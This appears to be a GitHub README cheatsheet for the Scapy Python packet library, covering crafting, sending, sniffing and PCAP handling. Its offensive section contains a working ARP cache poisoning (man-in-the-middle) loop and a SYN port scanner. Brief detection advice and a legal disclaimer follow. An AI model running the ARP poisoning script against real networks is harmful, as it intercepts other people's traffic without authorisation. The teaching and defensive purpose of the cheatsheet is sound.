# 🐍 Scapy - Complete Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)

```
  ███████╗ ██████╗ █████╗ ██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝
  ███████╗██║     ███████║██████╔╝ ╚████╔╝ 
  ╚════██║██║     ██╔══██║██╔═══╝   ╚██╔╝  
  ███████║╚██████╗██║  ██║██║        ██║   
  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝   
       Interactive Packet Crafting, Sniffing & Forging Engine
```

<p align="center">
  <img src="https://img.shields.io/badge/Scapy-Packet_Crafting-blue?style=for-the-badge" alt="Scapy">
  <img src="https://img.shields.io/badge/Author-Philippe_Biondi-orange?style=for-the-badge" alt="secdev">
  <img src="https://img.shields.io/badge/Language-Python-green?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Category-Network_Attacks-purple?style=for-the-badge" alt="Network Attacks">
</p>

<p align="center">
  <b>🐍 The ultimate Python-based interactive packet manipulation tool and library capable of forging, sending, sniffing, dissecting, and fuzzing arbitrary network packets</b>
</p>

---

## 📋 Table of Contents

- [Overview & The Stacking Layer Model (`/`)](#-overview--the-stacking-layer-model-)
- [Installation](#-installation)
- [Starting the Interactive Shell](#-starting-the-interactive-shell)
- [Crafting Network Packets](#-crafting-network-packets)
  - [IP and TCP Handshakes](#ip-and-tcp-handshakes)
  - [ICMP Ping & Traceroute](#icmp-ping--traceroute)
  - [DNS Queries & Resolution](#dns-queries--resolution)
- [Sending & Receiving Packets](#-sending--receiving-packets)
  - [Layer 3: `send()`, `sr()`, `sr1()`](#layer-3-send-sr-sr1)
  - [Layer 2: `sendp()`, `srp()`, `srp1()`](#layer-2-sendp-srp-srp1)
- [Packet Sniffing & PCAP Handling](#-packet-sniffing--pcap-handling)
  - [Capturing Live Packets (`sniff()`)](#capturing-live-packets-sniff)
  - [Reading & Writing PCAP Files](#reading--writing-pcap-files)
- [Offensive Network Attacks](#-offensive-network-attacks)
  - [ARP Cache Poisoning (MITM)](#arp-cache-poisoning-mitm)
  - [SYN Port Scanning Script](#syn-port-scanning-script)
  - [TCP SYN / ICMP Flooding](#tcp-syn--icmp-flooding)
- [Quick Reference Table](#-quick-reference-table)
- [Defensive Considerations & Detection](#-defensive-considerations--detection)
- [Legal Disclaimer](#-legal-disclaimer)

---

## 🎯 Overview & The Stacking Layer Model (`/`)

Created by **Philippe Biondi**, **Scapy** replaces dozens of single-purpose network tools (ping, traceroute, arpspoof, nmap stubs).

Scapy's genius lies in using Python's division operator (`/`) to stack protocol layers together:
```python
packet = Ether() / IP(dst="192.168.1.1") / TCP(dport=80, flags="S") / "Raw Payload"
```
Every layer field has sane default values that Scapy automatically calculates (checksums, lengths, MAC addresses, source IP).

---

## 📥 Installation

```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y python3-scapy

# Python pip (Latest version)
pip install scapy

# Arch Linux
sudo pacman -S python-scapy
```

---

## 🚀 Starting the Interactive Shell

Launch the interactive REPL shell (requires root privileges to forge raw sockets):

```bash
sudo scapy
```

Inspect available protocols and functions inside Scapy:
```python
>>> ls()          # List all supported network protocols (850+)
>>> ls(IP)        # List fields and defaults of the IP layer
>>> lsc()         # List available Scapy command functions
```

---

## 🛠️ Crafting Network Packets

### IP and TCP Handshakes
```python
# Create a TCP SYN packet to web port 80
syn_pkt = IP(dst="192.168.1.50") / TCP(dport=80, flags="S")
syn_pkt.show()
```

### ICMP Ping & Traceroute
```python
# Send ICMP Echo Request and await single response (sr1)
reply = sr1(IP(dst="8.8.8.8")/ICMP(), timeout=2)
if reply:
    reply.show()

# Automated graphical TCP traceroute
ans, unans = traceroute(["8.8.8.8", "1.1.1.1"], dport=443, maxttl=20)
```

### DNS Queries & Resolution
```python
# Craft raw DNS A-record query to 8.8.8.8
dns_query = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
response = sr1(dns_query, verbose=False)
print(response[DNS].summary())
```

---

## 📡 Sending & Receiving Packets

Scapy separates transmission by OSI Layer:

### Layer 3: `send()`, `sr()`, `sr1()`
Operates with kernel-assigned Ethernet headers (starts at IP layer):
- `send(pkt)`: Transmits packet at Layer 3; does not wait for a reply.
- `sr(pkt)`: Sends packets and returns answered and unanswered pairs `(ans, unans)`.
- `sr1(pkt)`: Sends packet and returns only the first response packet.

### Layer 2: `sendp()`, `srp()`, `srp1()`
Custom Ethernet/Data-link framing (starts at `Ether()`):
- `sendp(Ether() / IP(...), iface="eth0")`: Send raw Ethernet frame.
- `srp(Ether() / ARP(...))`: Send ARP request and receive reply.

---

## 🔍 Packet Sniffing & PCAP Handling

### Capturing Live Packets (`sniff()`)
```python
# Sniff 10 packets on interface eth0
pkts = sniff(iface="eth0", count=10)

# Sniff with BPF (Berkeley Packet Filter) syntax
http_pkts = sniff(filter="tcp port 80 or port 443", count=20)

# Process packets with custom callback function
def packet_callback(packet):
    if packet.haslayer(TCP):
        print(f"[{packet[IP].src}:{packet[TCP].sport}] -> [{packet[IP].dst}:{packet[TCP].dport}]")

sniff(iface="eth0", prn=packet_callback, store=0)
```

### Reading & Writing PCAP Files
```python
# Save captured packets to standard Wireshark PCAP
wrpcap("capture.pcap", pkts)

# Read PCAP file into Scapy list
read_pkts = rdpcap("capture.pcap")
read_pkts[0].show()
```

---

## ⚔️ Offensive Network Attacks

### ARP Cache Poisoning (MITM)
Spoof ARP tables to intercept traffic between victim and gateway:
```python
from scapy.all import *
import time

victim_ip = "192.168.1.105"
gateway_ip = "192.168.1.1"

# Craft deceptive ARP replies
victim_arp = ARP(op=2, pdst=victim_ip, psrc=gateway_ip)
gateway_arp = ARP(op=2, pdst=gateway_ip, psrc=victim_ip)

print("[*] Poisoning ARP tables...")
try:
    while True:
        send(victim_arp, verbose=False)
        send(gateway_arp, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Restoring network...")
```

### SYN Port Scanning Script
```python
def scan_port(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    resp = sr1(pkt, timeout=1, verbose=False)
    if resp and resp.haslayer(TCP):
        if resp[TCP].flags == 0x12: # SYN-ACK received
            print(f"[+] Port {port} is OPEN")
            # Send RST to be polite
            send(IP(dst=ip)/TCP(dport=port, flags="R"), verbose=False)

scan_port("192.168.1.1", 80)
```

---

## ⚡ Quick Reference Table

| Objective | Scapy Command |
|-----------|---------------|
| **Start Interactive Shell** | `sudo scapy` |
| **Inspect Protocol Fields** | `ls(IP)` or `ls(TCP)` |
| **Send L3 Packet** | `send(IP(dst="1.1.1.1")/ICMP())` |
| **Send & Receive 1st Reply**| `resp = sr1(IP(dst="1.1.1.1")/ICMP())` |
| **Send L2 Ethernet Frame** | `sendp(Ether()/IP(...), iface="eth0")` |
| **Sniff with BPF Filter** | `sniff(iface="eth0", filter="icmp", count=5)` |
| **Save to PCAP** | `wrpcap("out.pcap", pkts)` |
| **Read from PCAP** | `pkts = rdpcap("in.pcap")` |

---

## 🛡️ Defensive Considerations & Detection

1. **Dynamic ARP Inspection (DAI):** Configure enterprise switches with DAI and DHCP Snooping to drop forged gratuitous ARP replies.
2. **IDS/Suricata Rules:** Rapid half-open SYN sweeps and malformed TCP flag combinations (Xmas, NULL) generated by Scapy trigger standard IDS alerts.

---

## ⚠️ Legal Disclaimer

> [!CAUTION]
> Scapy can generate malformed packets that cause denial-of-service conditions or intercept private data. It must strictly be utilized in authorized security assessments and isolated testing networks.
